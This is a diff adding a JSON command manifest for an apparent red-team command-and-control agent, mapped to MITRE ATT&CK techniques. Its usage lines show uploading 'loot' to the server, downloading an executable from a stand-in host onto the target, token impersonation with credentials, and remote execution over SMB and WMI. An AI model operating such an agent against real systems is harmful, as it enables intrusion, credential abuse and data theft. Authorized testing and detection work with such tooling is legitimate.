@@ -1,0 +1,208 @@
+{
+  "commands": {
+    "execute": {
+      "description": "Execute local binary file (T1059.001)",
+      "usage": "execute C:\\path\\to\\file.exe",
+      "parameters": [
+        {
+          "name": "filePath",
+          "required": true,
+          "description": "Path to the executable file"
+        }
+      ]
+    },
+    "pkill": {
+      "description": "Kill a process by PID (T1489)",
+      "usage": "pkill 1234",
+      "parameters": [
+        {
+          "name": "pidKill",
+          "required": true,
+          "description": "Process ID to terminate"
+        }
+      ]
+    },
+    "plist": {
+      "description": "List all processes (T1057)",
+      "usage": "plist",
+      "parameters": []
+    },
+    "pname": {
+      "description": "Search process by name (T1057)",
+      "usage": "pname notepad",
+      "parameters": [
+        {
+          "name": "name",
+          "required": true,
+          "description": "Process name to search for"
+        }
+      ]
+    },
+    "upload": {
+      "description": "Upload file on the server (T1041)",
+      "usage": "upload C:\\loot.pdf",
+      "parameters": [
+        {
+          "name": "filePath",
+          "required": true,
+          "description": "Path to the file to upload"
+        }
+      ]
+    },
+    "download": {
+      "description": "Download a file in the target (T1105)",
+      "usage": "download http://server.com/file.exe C:\\path\\to\\save",
+      "parameters": [
+        {
+          "name": "url",
+          "required": true,
+          "description": "URL of the file to download"
+        },
+        {
+          "name": "outputDir",
+          "required": true,
+          "description": "Directory path where the file will be saved"
+        }
+      ]
+    },
+    "list": {
+      "description": "List directory files (T1083)",
+      "usage": "list C:\\",
+      "parameters": [
+        {
+          "name": "path",
+          "required": true,
+          "description": "Directory path to list"
+        }
+      ]
+    },
+    "shell": {
+      "description": "Execute PSH in isolated runspace (T1059.001)",
+      "usage": "shell whoami",
+      "parameters": [
+        {
+          "name": "cmd",
+          "required": true,
+          "description": "PowerShell command to execute"
+        }
+      ]
+    },
+    "screenshot": {
+      "description": "Capture and view screen (T1113)",
+      "usage": "screenshot",
+      "parameters": []
+    },
+    "delete": {
+      "description": "Remove file or directory (T1485)",
+      "usage": "delete C:\\temp\\file.txt",
+      "parameters": [
+        {
+          "name": "path",
+          "required": true,
+          "description": "Path to file or directory to delete"
+        }
+      ]
+    },
+    "fcopy": {
+      "description": "Copy file to new location (T1570)",
+      "usage": "fcopy C:\\source.txt C:\\dest.txt",
+      "parameters": [
+        {
+          "name": "paths",
+          "required": true,
+          "description": "Source and destination paths separated by space"
+        }
+      ]
+    },
+    "mkdir": {
+      "description": "Create new directory (T1106)",
+      "usage": "mkdir C:\\new_folder",
+      "parameters": [
+        {
+          "name": "path",
+          "required": true,
+          "description": "Directory path to create"
+        }
+      ]
+    },
+    "who": {
+      "description": "Get user and SID (T1033)",
+      "usage": "who",
+      "parameters": []
+    },
+    "asleep": {
+      "description": "Seconds between agent communications (T1497.003)",
+      "usage": "asleep 30",
+      "parameters": [
+        {
+          "name": "seconds",
+          "required": true,
+          "description": "Sleep time in seconds"
+        }
+      ]
+    },
+    "exit": {
+      "description": "Kill agent (T1562.001)",
+      "usage": "exit",
+      "parameters": []
+    },
+    "make_token": {
+      "description": "Create authentication token for user (T1134.003)",
+      "usage": "make_token DOMAIN\\User:Password",
+      "parameters": [
+        {
+          "name": "credentials",
+          "required": true,
+          "description": "User credentials in format DOMAIN\\User:Password"
+        }
+      ]
+    },
+    "rev2self": {
+      "description": "Resets the process token back to the current user (T1134.003)",
+      "usage": "rev2self",
+      "parameters": []
+    },
+    "smb_exec": {
+      "description": "Execute a command remotely via SMB/Invoke-Command (T1021.002)",
+      "usage": "smb_exec TARGET \"whoami\"  OR  smb_exec TARGET \"ipconfig /all\" DOMAIN\\User:Password",
+      "parameters": [
+        {
+          "name": "target",
+          "required": true,
+          "description": "Target host (IP or hostname)"
+        },
+        {
+          "name": "command",
+          "required": true,
+          "description": "Command to execute on the remote host"
+        },
+        {
+          "name": "credentials",
+          "required": false,
+          "description": "Optional. Format DOMAIN\\User:Password. If omitted, uses current/make_token session"
+        }
+      ]
+    },
+    "wmi_exec": {
+      "description": "Execute a command remotely via WMI (T1047)",
+      "usage": "wmi_exec TARGET \"whoami\"  OR  wmi_exec TARGET \"ipconfig /all\" DOMAIN\\User:Password",
+      "parameters": [
+        {
+          "name": "target",
+          "required": true,
+          "description": "Target host (IP or hostname)"
+        },
+        {
+          "name": "command",
+          "required": true,
+          "description": "Command to execute on the remote host"
+        },
+        {
+          "name": "credentials",
+          "required": false,
+          "description": "Optional. Format DOMAIN\\User:Password. If omitted, uses current/make_token session"
+        }
+      ]
+    }
+  }
+}
